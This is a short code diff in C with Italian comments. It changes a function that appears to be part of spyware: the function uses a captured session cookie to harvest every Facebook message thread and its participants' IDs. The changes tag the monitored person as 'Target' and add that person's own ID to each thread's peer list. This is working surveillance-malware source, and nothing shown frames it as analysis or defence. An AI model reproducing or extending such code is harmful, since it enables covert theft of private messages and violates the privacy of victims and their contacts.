@@ -113,6 +113,7 @@ DWORD HandleFBMessages(char *cookie)
 	BYTE *r_buffer_inner = NULL;
 	DWORD response_len, dummy;
 	WCHAR url[256];
+	BOOL me_present = FALSE;
 	BYTE *parser1, *parser2;
 	BYTE *parser_inner1, *parser_inner2;
 	WCHAR fb_request[256];
@@ -251,7 +252,7 @@ DWORD HandleFBMessages(char *cookie)
 		if (!parser2)
 			break;
 		*parser2 = 0;
-		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s", parser1);
+		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "Target, %s", parser1);
 		parser1 = parser2 + 1;
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
@@ -264,6 +265,7 @@ DWORD HandleFBMessages(char *cookie)
 		// Cerca gli id dei peers
 		parser_inner1 = r_buffer_inner;
 		memset(peers_id, 0, sizeof(peers_id));
+		me_present = FALSE;
 		for (;;) {
 			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_PEER_ID_IDENTIFIER);
 			if (!parser_inner2)
@@ -274,6 +276,9 @@ DWORD HandleFBMessages(char *cookie)
 				break;
 			*parser_inner2 = 0;
 
+			if (!strcmp((CHAR *)parser_inner1, user))
+				me_present = TRUE;
+
 			if (strlen(peers_id) == 0)
 				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
 			else
@@ -281,6 +286,8 @@ DWORD HandleFBMessages(char *cookie)
 			
 			parser_inner1 = parser_inner2 +1;
 		}	
+		if (!me_present)
+			_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, user);
 
 		// Clicla per tutti i messaggi del thread
 		for (;;) {			
